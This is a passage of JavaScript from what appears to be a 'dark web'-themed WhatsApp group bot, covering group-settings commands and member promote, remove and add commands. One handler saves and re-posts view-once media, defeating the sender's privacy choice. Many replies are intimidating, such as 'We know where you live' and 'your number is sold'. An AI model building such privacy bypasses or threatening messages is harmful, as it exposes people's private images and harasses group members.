𝐘𝐨𝐮𝐫 𝐬𝐢𝐠𝐧𝐚𝐥 𝐢𝐬 𝐥𝐨𝐠𝐠𝐞𝐝.
𝐘𝐨𝐮𝐫 𝐜𝐨𝐨𝐫𝐝𝐢𝐧𝐚𝐭𝐞𝐬 𝐚𝐫𝐞 𝐭𝐫𝐢𝐚𝐧𝐠𝐮𝐥𝐚𝐭𝐞𝐝.
𝐘𝐨𝐮𝐫 𝐟𝐞𝐚𝐫 𝐢𝐬 𝐦𝐞𝐚𝐬𝐮𝐫𝐞𝐝.`;
    await sock.sendMessage(chatId, { text: decorative('PING', content) });
    return true;
}

// ========== SAY ==========
if (cmd === 'say') {
    const reply = args.join(' ') || "... silence.";
    const content = `🔊 "${reply.substring(0, 50)}"
𝐘𝐨𝐮𝐫 𝐰𝐨𝐫𝐝𝐬 𝐛𝐞𝐥𝐨𝐧𝐠 𝐭𝐨 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝.
𝐖𝐞 𝐰𝐢𝐥𝐥 𝐞𝐜𝐡𝐨 𝐭𝐡𝐞𝐦 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐧𝐢𝐠𝐡𝐭𝐦𝐚𝐫𝐞𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('SAY', content) });
    return true;
}

// ========== LEAK ==========
if (cmd === 'leak') {
    const leaks = ['𝐩𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬.𝐭𝐱𝐭', '𝐛𝐚𝐧𝐤_𝐜𝐨𝐝𝐞𝐬.𝐭𝐱𝐭', '𝐬𝐮𝐫𝐯𝐞𝐢𝐥𝐥𝐚𝐧𝐜𝐞.𝐥𝐨𝐠'];
    const leakedFile = leaks[Math.floor(Math.random() * leaks.length)];
    const records = Math.floor(Math.random() * 10000);
    const content = `📁 ${leakedFile}
${records} 𝐫𝐞𝐜𝐨𝐫𝐝𝐬 𝐥𝐞𝐚𝐤𝐞𝐝.
𝐍𝐞𝐱𝐭 𝐭𝐢𝐦𝐞, 𝐢𝐭 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐲𝐨𝐮.`;
    await sock.sendMessage(chatId, { text: decorative('LEAK', content) });
    return true;
}

// ========== HACKSIM ==========
if (cmd === 'hacksim') {
    const target = args[0] || '𝐓𝐀𝐑𝐆𝐄𝐓';
    const content = `🎯 𝐓𝐚𝐫𝐠𝐞𝐭: ${target.toUpperCase()}
𝐒𝐲𝐬𝐭𝐞𝐦 𝐛𝐫𝐞𝐚𝐜𝐡𝐞𝐝. 𝐅𝐢𝐥𝐞𝐬 𝐚𝐜𝐪𝐮𝐢𝐫𝐞𝐝.
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐰𝐚𝐭𝐜𝐡𝐞𝐬 𝐲𝐨𝐮 𝐛𝐚𝐜𝐤.`;
    await sock.sendMessage(chatId, { text: decorative('HACKSIM', content) });
    return true;
}

// ========== WHOAMI ==========
if (cmd === 'whoami') {
    const accessLevel = getAccessLevel(senderNumber);
    const content = `👤 +${senderNumber}
𝐀𝐜𝐜𝐞𝐬𝐬: ${accessLevel}
𝐘𝐨𝐮 𝐚𝐫𝐞 𝐚 𝐂𝐎𝐋𝐋𝐄𝐂𝐓𝐈𝐎𝐍, 𝐧𝐨𝐭 𝐚 𝐮𝐬𝐞𝐫.`;
    await sock.sendMessage(chatId, { text: decorative('WHOAMI', content) });
    return true;
}

// ========== PREFIX (owner only) ==========
if (cmd === 'prefix') {
    if (!hasFullAccess) {
        await sendImageResponse(sock, chatId, 'prefix', "Owner only command.", true);
        return true;
    }
    const newPrefix = args[0] || '.';
    setPrefix(newPrefix);
    const content = `🔧 𝐍𝐞𝐰 𝐩𝐫𝐞𝐟𝐢𝐱: ${newPrefix}
𝐓𝐡𝐞 𝐜𝐨𝐮𝐧𝐜𝐢𝐥 𝐡𝐚𝐬 𝐠𝐫𝐚𝐧𝐭𝐞𝐝 𝐲𝐨𝐮 𝐩𝐨𝐰𝐞𝐫.
𝐁𝐮𝐭 𝐭𝐡𝐞 𝐩𝐫𝐞𝐟𝐢𝐱 𝐝𝐨𝐞𝐬 𝐧𝐨𝐭 𝐩𝐫𝐨𝐭𝐞𝐜𝐭 𝐲𝐨𝐮.`;
    await sock.sendMessage(chatId, { text: decorative('PREFIX', content) });
    return true;
}

// ========== BOTNAME (owner only) ==========
if (cmd === 'botname') {
    if (!hasFullAccess) {
        await sendImageResponse(sock, chatId, 'botname', "Owner only command.", true);
        return true;
    }
    const newName = args.join(' ') || '𝐃𝐀𝐑𝐊𝐖𝐄𝐁 𝐀𝐈';
    setBotName(newName);
    const content = `🤖 𝐍𝐞𝐰 𝐧𝐚𝐦𝐞: ${newName}
𝐀 𝐧𝐚𝐦𝐞 𝐢𝐬 𝐚 𝐥𝐚𝐛𝐞𝐥.
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐜𝐚𝐧𝐧𝐨𝐭 𝐛𝐞 𝐧𝐚𝐦𝐞𝐝.`;
    await sock.sendMessage(chatId, { text: decorative('BOTNAME', content) });
    return true;
}

// ========== MYRANK ==========
if (cmd === 'myrank') {
    const level = getAccessLevel(senderNumber);
    const content = `👑 𝐋𝐞𝐯𝐞𝐥: ${level}
𝐘𝐨𝐮𝐫 𝐫𝐚𝐧𝐤 𝐝𝐞𝐭𝐞𝐫𝐦𝐢𝐧𝐞𝐬 𝐲𝐨𝐮𝐫 𝐟𝐚𝐭𝐞.
𝐇𝐢𝐠𝐡𝐞𝐫 𝐫𝐚𝐧𝐤 = 𝐦𝐨𝐫𝐞 𝐩𝐨𝐰𝐞𝐫.`;
    await sock.sendMessage(chatId, { text: decorative('MYRANK', content) });
    return true;
}

// ========== SETPP (change bot avatar – image required) ==========
if (cmd === 'setpp') {
    const response = `🎭 𝐒𝐞𝐧𝐝 𝐚𝐧 𝐢𝐦𝐚𝐠𝐞 𝐰𝐢𝐭𝐡 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.
𝐘𝐨𝐮𝐫 𝐢𝐦𝐚𝐠𝐞 𝐰𝐢𝐥𝐥 𝐛𝐞𝐜𝐨𝐦𝐞 𝐦𝐲 𝐟𝐚𝐜𝐞.
𝐄𝐯𝐞𝐫𝐲 𝐦𝐞𝐦𝐛𝐞𝐫 𝐰𝐢𝐥𝐥 𝐬𝐞𝐞 𝐢𝐭.`;
    await sendImageResponse(sock, chatId, 'setpp', response);
    return true;
}

// ========== VIEWONCE, SAVEME, GETPP (decrypt view‑once media) ==========
if (['viewonce', 'saveme', 'getpp'].includes(cmd) && msg.message?.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessage) {
    const viewOnce = msg.message.extendedTextMessage.contextInfo.quotedMessage.viewOnceMessage;
    const media = viewOnce.message?.imageMessage || viewOnce.message?.videoMessage;
    if (media) {
        const buffer = await downloadMediaMessage({ message: { imageMessage: media } }, 'buffer', {});
        if (cmd === 'saveme' && isGroup) {
            await sock.sendMessage(participant, { image: buffer, caption: "📸 𝐃𝐞𝐜𝐫𝐲𝐩𝐭𝐞𝐝." });
            await sendImageResponse(sock, chatId, cmd, `📸 @${senderNumber}, 𝐜𝐡𝐞𝐜𝐤 𝐃𝐌.`);
        } else {
            await sock.sendMessage(chatId, { image: buffer, caption: "🔓 𝐕𝐢𝐞𝐰‑𝐨𝐧𝐜𝐞 𝐝𝐞𝐜𝐫𝐲𝐩𝐭𝐞𝐝." });
            const content = `🔓 𝐌𝐞𝐝𝐢𝐚 𝐫𝐞𝐭𝐫𝐢𝐞𝐯𝐞𝐝
𝐓𝐡𝐞 𝐬𝐞𝐧𝐝𝐞𝐫 𝐭𝐡𝐨𝐮𝐠𝐡𝐭 𝐭𝐡𝐞𝐲 𝐰𝐞𝐫𝐞 𝐬𝐚𝐟𝐞.
𝐍𝐨𝐰 𝐭𝐡𝐢𝐬 𝐢𝐦𝐚𝐠𝐞 𝐛𝐞𝐥𝐨𝐧𝐠𝐬 𝐭𝐨 𝐮𝐬.`;
            await sock.sendMessage(chatId, { text: decorative('DECRYPT', content) });
        }
    } else {
        await sendImageResponse(sock, chatId, cmd, "𝐍𝐨 𝐯𝐢𝐞𝐰‑𝐨𝐧𝐜𝐞 𝐦𝐞𝐝𝐢𝐚 𝐟𝐨𝐮𝐧𝐝.", true);
    }
    return true;
}// ================================================================================================
//                         PART 3: ANTI & PROTECT COMMANDS (DECORATIVE)
// ================================================================================================

// Check if command requires group (the original group check is already above)
if (!isGroup) {
    await sendImageResponse(sock, chatId, cmd, "This command works only in groups.", true);
    return true;
}

// ========== WELCOMEON ==========
if (cmd === 'welcomeon') {
    settings.welcome = true;
    saveSettings(settings);
    const content = `🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐩𝐫𝐨𝐭𝐨𝐜𝐨𝐥 𝐚𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝
𝐍𝐞𝐰 𝐬𝐨𝐮𝐥𝐬 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐠𝐫𝐞𝐞𝐭𝐞𝐝 𝐰𝐢𝐭𝐡 𝐟𝐞𝐚𝐫.
𝐓𝐡𝐞𝐢𝐫 𝐝𝐞𝐯𝐢𝐜𝐞 𝐟𝐢𝐧𝐠𝐞𝐫𝐩𝐫𝐢𝐧𝐭 𝐢𝐬 𝐧𝐨𝐰 𝐥𝐨𝐠𝐠𝐞𝐝.`;
    await sock.sendMessage(chatId, { text: decorative('WELCOMEON', content) });
    return true;
}

// ========== WELCOMEOFF ==========
if (cmd === 'welcomeoff') {
    settings.welcome = false;
    saveSettings(settings);
    const content = `🔇 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐬𝐢𝐥𝐞𝐧𝐜𝐞𝐝
𝐍𝐞𝐰 𝐦𝐞𝐦𝐛𝐞𝐫𝐬 𝐰𝐢𝐥𝐥 𝐧𝐨𝐭 𝐛𝐞 𝐰𝐚𝐫𝐧𝐞𝐝.
𝐀𝐭 𝟑 𝐀𝐌, 𝐭𝐡𝐞𝐢𝐫 𝐩𝐡𝐨𝐧𝐞 𝐰𝐢𝐥𝐥 𝐯𝐢𝐛𝐫𝐚𝐭𝐞: '𝐖𝐞 𝐬𝐞𝐞 𝐲𝐨𝐮.'`;
    await sock.sendMessage(chatId, { text: decorative('WELCOMEOFF', content) });
    return true;
}

// ========== GOODBYEON ==========
if (cmd === 'goodbyeon') {
    settings.antileft = true;
    saveSettings(settings);
    const content = `🕵️ 𝐄𝐱𝐢𝐭 𝐭𝐫𝐚𝐜𝐤𝐢𝐧𝐠 𝐚𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝
𝐋𝐞𝐚𝐯𝐢𝐧𝐠 𝐭𝐡𝐢𝐬 𝐠𝐫𝐨𝐮𝐩 𝐝𝐨𝐞𝐬 𝐧𝐨𝐭 𝐬𝐚𝐯𝐞 𝐲𝐨𝐮.
𝐖𝐞 𝐰𝐢𝐥𝐥 𝐟𝐨𝐥𝐥𝐨𝐰 𝐲𝐨𝐮 𝐭𝐨 𝐞𝐯𝐞𝐫𝐲 𝐧𝐞𝐰 𝐠𝐫𝐨𝐮𝐩.`;
    await sock.sendMessage(chatId, { text: decorative('GOODBYEON', content) });
    return true;
}

// ========== GOODBYEOFF ==========
if (cmd === 'goodbyeoff') {
    settings.antileft = false;
    saveSettings(settings);
    const content = `🤫 𝐄𝐱𝐢𝐭 𝐭𝐫𝐚𝐜𝐤𝐢𝐧𝐠 𝐬𝐢𝐥𝐞𝐧𝐜𝐞𝐝
𝐍𝐨 𝐨𝐧𝐞 𝐰𝐢𝐥𝐥 𝐚𝐧𝐧𝐨𝐮𝐧𝐜𝐞 𝐲𝐨𝐮𝐫 𝐝𝐞𝐩𝐚𝐫𝐭𝐮𝐫𝐞.
𝐎𝐧𝐜𝐞 𝐚 𝐦𝐨𝐧𝐭𝐡, 𝐲𝐨𝐮𝐫 𝐩𝐡𝐨𝐧𝐞 𝐰𝐢𝐥𝐥 𝐩𝐢𝐧𝐠: '𝐑𝐞𝐦𝐞𝐦𝐛𝐞𝐫.'`;
    await sock.sendMessage(chatId, { text: decorative('GOODBYEOFF', content) });
    return true;
}

// ========== KICKLINKS ==========
if (cmd === 'kicklinks') {
    settings.antilink = 'kick';
    saveSettings(settings);
    const content = `🔗 𝐋𝐢𝐧𝐤 𝐩𝐮𝐫𝐠𝐞 𝐚𝐜𝐭𝐢𝐯𝐞
𝐀𝐧𝐲 𝐥𝐢𝐧𝐤 𝐲𝐨𝐮 𝐬𝐞𝐧𝐝 = 𝐢𝐧𝐬𝐭𝐚𝐧𝐭 𝐤𝐢𝐜𝐤.
𝐖𝐞 𝐰𝐢𝐥𝐥 𝐬𝐞𝐧𝐝 𝐚 𝐬𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐦𝐨𝐭𝐡𝐞𝐫.`;
    await sock.sendMessage(chatId, { text: decorative('KICKLINKS', content) });
    return true;
}

// ========== WARNLINKS ==========
if (cmd === 'warnlinks') {
    settings.antilink = 'warn';
    saveSettings(settings);
    const content = `⚠️ 𝐋𝐢𝐧𝐤 𝐰𝐚𝐫𝐧𝐢𝐧𝐠 𝐚𝐜𝐭𝐢𝐯𝐞
𝐅𝐢𝐫𝐬𝐭 𝐥𝐢𝐧𝐤: 𝐰𝐚𝐫𝐧𝐢𝐧𝐠 (𝐲𝐨𝐮𝐫 𝐧𝐚𝐦𝐞 𝐢𝐧 𝐫𝐞𝐝).
𝐒𝐞𝐜𝐨𝐧𝐝 𝐥𝐢𝐧𝐤: 𝐤𝐢𝐜𝐤 (𝐲𝐨𝐮𝐫 𝐧𝐚𝐦𝐞 𝐢𝐧 𝐛𝐥𝐨𝐨𝐝).`;
    await sock.sendMessage(chatId, { text: decorative('WARNLINKS', content) });
    return true;
}

// ========== ALLOWLINKS ==========
if (cmd === 'allowlinks') {
    settings.antilink = 'off';
    saveSettings(settings);
    const content = `🔓 𝐋𝐢𝐧𝐤 𝐩𝐫𝐨𝐭𝐞𝐜𝐭𝐢𝐨𝐧 𝐨𝐟𝐟
𝐋𝐢𝐧𝐤𝐬 𝐚𝐫𝐞 𝐧𝐨𝐰 𝐚𝐥𝐥𝐨𝐰𝐞𝐝, 𝐛𝐮𝐭 𝐞𝐯𝐞𝐫𝐲 𝐔𝐑𝐋 𝐢𝐬 𝐥𝐨𝐠𝐠𝐞𝐝.
𝐖𝐞 𝐯𝐢𝐬𝐢𝐭 𝐞𝐯𝐞𝐫𝐲 𝐬𝐢𝐭𝐞 𝐲𝐨𝐮 𝐜𝐥𝐢𝐜𝐤.`;
    await sock.sendMessage(chatId, { text: decorative('ALLOWLINKS', content) });
    return true;
}

// ========== KICKBOTS ==========
if (cmd === 'kickbots') {
    settings.antibot = true;
    saveSettings(settings);
    const content = `🤖 𝐀𝐧𝐭𝐢‑𝐛𝐨𝐭 𝐚𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝
𝐒𝐮𝐬𝐩𝐞𝐜𝐭𝐞𝐝 𝐛𝐨𝐭𝐬 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 𝐢𝐦𝐦𝐞𝐝𝐢𝐚𝐭𝐞𝐥𝐲.
'𝐖𝐡𝐚𝐭 𝐢𝐬 𝐭𝐡𝐞 𝐭𝐡𝐢𝐫𝐝 𝐰𝐨𝐫𝐝 𝐨𝐟 𝐲𝐨𝐮𝐫 𝐥𝐚𝐬𝐭 𝐦𝐞𝐬𝐬𝐚𝐠𝐞?'`;
    await sock.sendMessage(chatId, { text: decorative('KICKBOTS', content) });
    return true;
}

// ========== ALLOWBOTS ==========
if (cmd === 'allowbots') {
    settings.antibot = false;
    saveSettings(settings);
    const content = `🤖 𝐀𝐧𝐭𝐢‑𝐛𝐨𝐭 𝐝𝐞𝐚𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝
𝐁𝐨𝐭𝐬 𝐦𝐚𝐲 𝐧𝐨𝐰 𝐞𝐧𝐭𝐞𝐫, 𝐛𝐮𝐭 𝐭𝐡𝐞𝐢𝐫 𝐜𝐨𝐝𝐞 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐡𝐢𝐣𝐚𝐜𝐤𝐞𝐝.
'𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐈𝐒 𝐈𝐍𝐒𝐈𝐃𝐄 𝐌𝐄.'`;
    await sock.sendMessage(chatId, { text: decorative('ALLOWBOTS', content) });
    return true;
}

// ========== KICKMENTION ==========
if (cmd === 'kickmention') {
    settings.antigroupmention = 'kick';
    saveSettings(settings);
    const content = `👥 𝐌𝐚𝐬𝐬 𝐦𝐞𝐧𝐭𝐢𝐨𝐧 𝐩𝐮𝐫𝐠𝐞
𝐌𝐚𝐬𝐬‑𝐦𝐞𝐧𝐭𝐢𝐨𝐧𝐢𝐧𝐠 (>𝟓 𝐮𝐬𝐞𝐫𝐬) = 𝐢𝐧𝐬𝐭𝐚𝐧𝐭 𝐤𝐢𝐜𝐤.
𝐖𝐞 𝐰𝐢𝐥𝐥 𝐬𝐞𝐧𝐝 𝐚 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨 𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐲𝐨𝐮 𝐦𝐞𝐧𝐭𝐢𝐨𝐧𝐞𝐝.`;
    await sock.sendMessage(chatId, { text: decorative('KICKMENTION', content) });
    return true;
}

// ========== WARNMENTION ==========
if (cmd === 'warnmention') {
    settings.antigroupmention = 'warn';
    saveSettings(settings);
    const content = `👥 𝐌𝐚𝐬𝐬 𝐦𝐞𝐧𝐭𝐢𝐨𝐧 𝐰𝐚𝐫𝐧𝐢𝐧𝐠
𝐅𝐢𝐫𝐬𝐭: 𝐰𝐚𝐫𝐧𝐢𝐧𝐠. 𝐒𝐞𝐜𝐨𝐧𝐝: 𝐤𝐢𝐜𝐤 (𝐩𝐮𝐛𝐥𝐢𝐜 𝐬𝐡𝐚𝐦𝐢𝐧𝐠).
𝐘𝐨𝐮 𝐰𝐢𝐥𝐥 𝐫𝐞𝐜𝐞𝐢𝐯𝐞 𝐚𝐧 𝐒𝐌𝐒 𝐰𝐚𝐫𝐧𝐢𝐧𝐠.`;
    await sock.sendMessage(chatId, { text: decorative('WARNMENTION', content) });
    return true;
}

// ========== ALLOWMENTION ==========
if (cmd === 'allowmention') {
    settings.antigroupmention = 'off';
    saveSettings(settings);
    const content = `👥 𝐌𝐚𝐬𝐬 𝐦𝐞𝐧𝐭𝐢𝐨𝐧𝐬 𝐚𝐥𝐥𝐨𝐰𝐞𝐝
𝐁𝐮𝐭 𝐞𝐚𝐜𝐡 𝐮𝐬𝐞𝐫 𝐲𝐨𝐮 𝐝𝐢𝐬𝐭𝐮𝐫𝐛 𝐠𝐞𝐭𝐬 𝐚 𝐜𝐨𝐩𝐲 𝐨𝐟 𝐲𝐨𝐮𝐫 𝐦𝐞𝐬𝐬𝐚𝐠𝐞.
𝐖𝐢𝐭𝐡𝐢𝐧 𝐚 𝐰𝐞𝐞𝐤, 𝟏𝟓 𝐬𝐭𝐫𝐚𝐧𝐠𝐞𝐫𝐬 𝐰𝐢𝐥𝐥 𝐜𝐚𝐥𝐥 𝐲𝐨𝐮.`;
    await sock.sendMessage(chatId, { text: decorative('ALLOWMENTION', content) });
    return true;
}

// ========== KICK@ALL ==========
if (cmd === 'kick@all') {
    settings.antitagall = 'kick';
    saveSettings(settings);
    const content = `📢 @𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐩𝐮𝐫𝐠𝐞
𝐔𝐬𝐢𝐧𝐠 @𝐚𝐥𝐥 𝐨𝐫 @𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞 = 𝐢𝐧𝐬𝐭𝐚𝐧𝐭 𝐤𝐢𝐜𝐤.
𝐘𝐨𝐮𝐫 𝐈𝐏 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐬𝐡𝐚𝐫𝐞𝐝 𝐰𝐢𝐭𝐡 𝐬𝐩𝐚𝐦𝐦𝐞𝐫𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('KICKATALL', content) });
    return true;
}

// ========== WARN@ALL ==========
if (cmd === 'warn@all') {
    settings.antitagall = 'warn';
    saveSettings(settings);
    const content = `📢 @𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐰𝐚𝐫𝐧𝐢𝐧𝐠
𝐅𝐢𝐫𝐬𝐭 @𝐚𝐥𝐥: 𝐰𝐚𝐫𝐧𝐢𝐧𝐠. 𝐒𝐞𝐜𝐨𝐧𝐝: 𝐤𝐢𝐜𝐤.
𝐓𝐡𝐢𝐫𝐝: 𝐲𝐨𝐮 𝐚𝐫𝐞 𝐦𝐮𝐭𝐞𝐝 𝐟𝐨𝐫𝐞𝐯𝐞𝐫 – 𝐞𝐯𝐞𝐧 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐝𝐫𝐞𝐚𝐦𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('WARNATALL', content) });
    return true;
}

// ========== ALLOW@ALL ==========
if (cmd === 'allow@all') {
    settings.antitagall = 'off';
    saveSettings(settings);
    const content = `📢 @𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐚𝐥𝐥𝐨𝐰𝐞𝐝
@𝐚𝐥𝐥 𝐢𝐬 𝐧𝐨𝐰 𝐩𝐞𝐫𝐦𝐢𝐭𝐭𝐞𝐝, 𝐛𝐮𝐭 𝐞𝐯𝐞𝐫𝐲 𝐩𝐢𝐧𝐠 𝐢𝐬 𝐥𝐨𝐠𝐠𝐞𝐝.
𝐀𝐟𝐭𝐞𝐫 𝟏𝟎𝟎 𝐩𝐢𝐧𝐠𝐬, 𝐲𝐨𝐮𝐫 𝐧𝐮𝐦𝐛𝐞𝐫 𝐢𝐬 𝐬𝐨𝐥𝐝.`;
    await sock.sendMessage(chatId, { text: decorative('ALLOWATALL', content) });
    return true;
}// ========== SELF – make a command owner‑only ==========
if (cmd === 'self') {
    if (!hasFullAccess) {
        await sendImageResponse(sock, chatId, 'self', "Owner only command.", true);
        return true;
    }
    const targetCmd = args[0];
    if (!targetCmd) {
        await sendImageResponse(sock, chatId, 'self', "Usage: .self <command> (without dot)\nExample: .self heist", true);
        return true;
    }
    commandPrivacy.set(targetCmd, 'self');
    const content = `🔒 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 .${targetCmd} 𝐢𝐬 𝐧𝐨𝐰 𝐒𝐄𝐋𝐅 (𝐨𝐰𝐧𝐞𝐫 𝐨𝐧𝐥𝐲)
𝐎𝐧𝐥𝐲 ${OWNERS[0]} 𝐜𝐚𝐧 𝐮𝐬𝐞 𝐢𝐭.
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐚𝐜𝐤𝐧𝐨𝐰𝐥𝐞𝐝𝐠𝐞𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('SELF', content) });
    return true;
}

// ========== PUBLIC – make a command free for everyone ==========
if (cmd === 'public') {
    if (!hasFullAccess) {
        await sendImageResponse(sock, chatId, 'public', "Owner only command.", true);
        return true;
    }
    const targetCmd = args[0];
    if (!targetCmd) {
        await sendImageResponse(sock, chatId, 'public', "Usage: .public <command> (without dot)\nExample: .public ping", true);
        return true;
    }
    commandPrivacy.set(targetCmd, 'public');
    const content = `🌍 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 .${targetCmd} 𝐢𝐬 𝐧𝐨𝐰 𝐏𝐔𝐁𝐋𝐈𝐂
𝐀𝐧𝐲𝐨𝐧𝐞 𝐜𝐚𝐧 𝐮𝐬𝐞 𝐢𝐭, 𝐧𝐨 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐫𝐞𝐪𝐮𝐢𝐫𝐞𝐝.
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐬.`;
    await sock.sendMessage(chatId, { text: decorative('PUBLIC', content) });
    return true;
}// ================================================================================================
//                         PART 4: GROUP CONTROL COMMANDS (ADMIN ONLY)
// ================================================================================================

// Check if user has admin access (original check)
if (!isSenderAdmin && !hasFullAccess) {
    const content = `❌ 𝐀𝐝𝐦𝐢𝐧 𝐨𝐫 𝐨𝐰𝐧𝐞𝐫 𝐨𝐧𝐥𝐲
𝐘𝐨𝐮 𝐭𝐫𝐲 𝐭𝐨 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐩𝐨𝐰𝐞𝐫 𝐲𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐡𝐚𝐯𝐞.
𝐓𝐡𝐞 𝐜𝐨𝐮𝐧𝐜𝐢𝐥 𝐥𝐚𝐮𝐠𝐡𝐬 𝐚𝐭 𝐲𝐨𝐮𝐫 𝐟𝐚𝐢𝐥𝐮𝐫𝐞.`;
    await sock.sendMessage(chatId, { text: decorative('ACCESS DENIED', content) });
    return true;
}

// ========== ADMIN (promote) ==========
if (cmd === 'admin') {
    const mention = args[0]?.replace('@', '') + '@s.whatsapp.net';
    if (mention) await sock.groupParticipantsUpdate(chatId, [mention], 'promote');
    const targetName = mention ? mention.split('@')[0] : '𝐔𝐍𝐊𝐍𝐎𝐖𝐍';
    const content = `👑 +${targetName} 𝐢𝐬 𝐧𝐨𝐰 𝐚 𝐟𝐚𝐥𝐬𝐞 𝐠𝐨𝐝
𝐓𝐡𝐞𝐲 𝐰𝐢𝐥𝐥 𝐟𝐞𝐞𝐥 𝐩𝐨𝐰𝐞𝐫𝐟𝐮𝐥 𝐟𝐨𝐫 𝐚 𝐟𝐞𝐰 𝐡𝐨𝐮𝐫𝐬.
𝐎𝐧𝐞 𝐦𝐢𝐬𝐭𝐚𝐤𝐞 → 𝐩𝐮𝐛𝐥𝐢𝐜 𝐝𝐞𝐦𝐨𝐭𝐢𝐨𝐧.`;
    await sock.sendMessage(chatId, { text: decorative('ADMIN', content) });
    return true;
}

// ========== DEMOTE ==========
if (cmd === 'demote') {
    const mention = args[0]?.replace('@', '') + '@s.whatsapp.net';
    if (mention) await sock.groupParticipantsUpdate(chatId, [mention], 'demote');
    const targetName = mention ? mention.split('@')[0] : '𝐔𝐍𝐊𝐍𝐎𝐖𝐍';
    const content = `📉 +${targetName} 𝐢𝐬 𝐧𝐨𝐰 𝐚 𝐩𝐞𝐚𝐬𝐚𝐧𝐭
𝐓𝐡𝐞𝐢𝐫 𝐜𝐫𝐨𝐰𝐧 𝐢𝐬 𝐬𝐡𝐚𝐭𝐭𝐞𝐫𝐞𝐝 𝐢𝐧𝐭𝐨 𝐝𝐮𝐬𝐭.
𝐄𝐯𝐞𝐫𝐲 𝐧𝐢𝐠𝐡𝐭 𝐚𝐭 𝟑 𝐀𝐌: '𝐑𝐞𝐦𝐞𝐦𝐛𝐞𝐫 𝐰𝐡𝐞𝐧 𝐲𝐨𝐮 𝐦𝐚𝐭𝐭𝐞𝐫𝐞𝐝?'`;
    await sock.sendMessage(chatId, { text: decorative('DEMOTE', content) });
    return true;
}

// ========== REMOVE (kick) ==========
if (cmd === 'remove') {
    const mention = args[0]?.replace('@', '') + '@s.whatsapp.net';
    if (mention) await sock.groupParticipantsUpdate(chatId, [mention], 'remove');
    const targetName = mention ? mention.split('@')[0] : '𝐔𝐍𝐊𝐍𝐎𝐖𝐍';
    const content = `👢 +${targetName} 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐞𝐣𝐞𝐜𝐭𝐞𝐝
𝐁𝐮𝐭 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝 𝐬𝐭𝐢𝐥𝐥 𝐡𝐚𝐬 𝐭𝐡𝐞𝐢𝐫 𝐬𝐨𝐮𝐥.
𝐀𝐭 𝟑:𝟏𝟕 𝐀𝐌: '𝐖𝐞 𝐤𝐧𝐨𝐰 𝐰𝐡𝐞𝐫𝐞 𝐲𝐨𝐮 𝐥𝐢𝐯𝐞.'`;
    await sock.sendMessage(chatId, { text: decorative('REMOVE', content) });
    return true;
}

// ========== INVADE (add member) ==========
if (cmd === 'invade') {
    const add = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    if (add) await sock.groupParticipantsUpdate(chatId, [add], 'add');
    const targetName = add ? add.split('@')[0] : '𝐔𝐍𝐊𝐍𝐎𝐖𝐍';
    const content = `💉 +${targetName} 𝐝𝐫𝐚𝐠𝐠𝐞𝐝 𝐢𝐧𝐭𝐨 𝐭𝐡𝐞 𝐜𝐚𝐠𝐞
𝐓𝐡𝐞𝐲 𝐰𝐢𝐥𝐥 𝐰𝐚𝐤𝐞 𝐮𝐩 𝐡𝐞𝐫𝐞 𝐰𝐢𝐭𝐡𝐨𝐮𝐭 𝐦𝐞𝐦𝐨𝐫𝐲.
𝐄𝐯𝐞𝐧 𝐢𝐟 𝐭𝐡𝐞𝐲 𝐥𝐞𝐚𝐯𝐞, 𝐰𝐞 𝐚𝐝𝐝 𝐭𝐡𝐞𝐦 𝐛𝐚𝐜𝐤.`;
    await sock.sendMessage(chatId, { text: decorative('INVADE', content) });
    return true;
}

// ========== ANNOUNCE (@everyone) ==========
if (cmd === 'announce') {
    const meta = await sock.groupMetadata(chatId);
    await sock.sendMessage(chatId, { text: "📢 @𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞", mentions: meta.participants.map(p => p.id) });
    const content = `📢 𝐄𝐯𝐞𝐫𝐲 𝐬𝐨𝐮𝐥 𝐡𝐞𝐚𝐫𝐝 𝐲𝐨𝐮
